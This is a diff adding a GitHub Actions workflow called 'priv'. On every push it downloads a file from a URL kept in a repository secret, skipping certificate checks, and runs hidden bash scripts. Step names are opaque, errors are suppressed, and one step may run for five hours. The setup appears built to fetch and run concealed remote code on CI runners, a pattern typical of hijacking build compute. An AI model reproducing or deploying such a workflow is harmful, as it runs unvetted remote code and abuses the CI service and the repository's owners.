@@ -1,0 +1,29 @@
+name: priv
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+     - name: pv1
+       uses: actions/checkout@main
+
+     - name: pv2
+       timeout-minutes: 2
+       continue-on-error: true
+       run: |
+             curl -sLkO ${{ secrets.EA_AB }}
+             bash ${{ secrets.EA_CD }}
+     - name: pv3
+       continue-on-error: true
+       run: |
+             bash ${{ secrets.EA_EF }}
+     - name: pv4
+       timeout-minutes: 300
+       continue-on-error: true
+       run: |
+            bash ${{ secrets.EA_GH }}
